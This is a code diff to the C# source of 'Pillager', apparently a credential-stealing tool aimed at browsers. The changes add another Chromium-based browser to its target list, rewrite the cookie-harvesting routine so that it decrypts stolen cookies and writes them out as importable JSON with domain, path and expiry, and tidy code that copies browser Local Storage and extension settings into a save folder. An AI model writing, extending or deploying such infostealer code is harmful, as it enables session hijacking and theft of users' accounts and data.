@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Runtime.Remoting.Messaging;
 using System.Security.Cryptography;
 using System.Text;
 using Pillager.Helper;
@@ -29,6 +30,7 @@ namespace Pillager.Browsers
             { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
             { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
             { "360ChromeX", "360ChromeX\\Chrome\\User Data" } ,
+            { "360Chrome", "360Chrome\\Chrome\\User Data" } ,
             { "Vivaldi", "Vivaldi\\User Data" } ,
             { "CocCoc", "CocCoc\\Browser\\User Data" },
             { "Torch", "Torch\\User Data" },
@@ -36,7 +38,7 @@ namespace Pillager.Browsers
             { "Orbitum", "Orbitum\\User Data" },
             { "CentBrowser", "CentBrowser\\User Data" },
             { "7Star", "7Star\\7Star\\User Data" },
-            {"Sputnik", "Sputnik\\Sputnik\\User Data" },
+            { "Sputnik", "Sputnik\\Sputnik\\User Data" },
             { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
             { "Uran", "uCozMedia\\Uran\\User Data" },
             { "Yandex", "Yandex\\YandexBrowser\\User Data" },
@@ -191,14 +193,48 @@ namespace Pillager.Browsers
                         string host_key = handler.GetValue(i, "host_key");
                         string name = handler.GetValue(i, "name");
                         string crypt = handler.GetValue(i, "encrypted_value");
+                        string path = handler.GetValue(i, "path");
+                        long expDate;
+                        double expDateDouble = 0;
+                        long.TryParse(handler.GetValue(i, "expires_utc"), out expDate);
+                        if ((expDate / 1000000.000000000000) - 11644473600 > 0)
+                            expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
                         string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-                        cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
+                        cookies.AppendLine("{");
+                        cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
+                        cookies.AppendLine("    \"expirationDate\": \"" + expDateDouble + "\",");
+                        cookies.AppendLine("    \"hostOnly\": false,");
+                        cookies.AppendLine("    \"name\": \"" + name + "\",");
+                        cookies.AppendLine("    \"path\": \"" + path + "\",");
+                        cookies.AppendLine("    \"session\": true,");
+                        cookies.AppendLine("    \"storeId\": \"0\",");
+                        cookies.AppendLine("    \"value\": \"" + cookie + "\"");
+                        cookies.AppendLine("},");
                     }
                     File.Delete(cookie_tempFile);
                 }
                 catch { }
             }
+            if (cookies.Length > 0)
+            {
+                return "[" + cookies.ToString() + "]";
+            }
             return cookies.ToString();
+        }
+
+        public static DateTime TimeEpoch(long epoch)
+        {
+            var maxTime = 99633311740000000L;
+
+            if (epoch > maxTime)
+            {
+                return new DateTime(2049, 1, 1, 1, 1, 1, DateTimeKind.Local);
+            }
+
+            var epochTicks = epoch * 10; // Convert to ticks
+            var epochDateTime = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddTicks(epochTicks).ToLocalTime();
+
+            return epochDateTime;
         }
 
         public static string Chrome_books()
@@ -252,8 +288,8 @@ namespace Pillager.Browsers
                     foreach (var profile in profiles)
                     {
                         Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
-                        if (Directory.Exists(Path.Combine(BrowserPath, profile+"\\Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Storage"), Path.Combine(savepath, profile + "\\Local Storage"), true);
-                        if (Directory.Exists(Path.Combine(BrowserPath, profile+"\\Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"), Path.Combine(savepath, profile + "\\Local Extension Settings"), true);
+                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Storage"), Path.Combine(savepath, profile + "\\Local Storage"), true);
+                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"), Path.Combine(savepath, profile + "\\Local Extension Settings"), true);
                         if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"), Path.Combine(savepath, profile + "\\Sync Extension Settings"), true);
                         if (Directory.GetDirectories(Path.Combine(BrowserPath, profile)).Length == 0) Directory.Delete(Path.Combine(BrowserPath, profile));
                     }
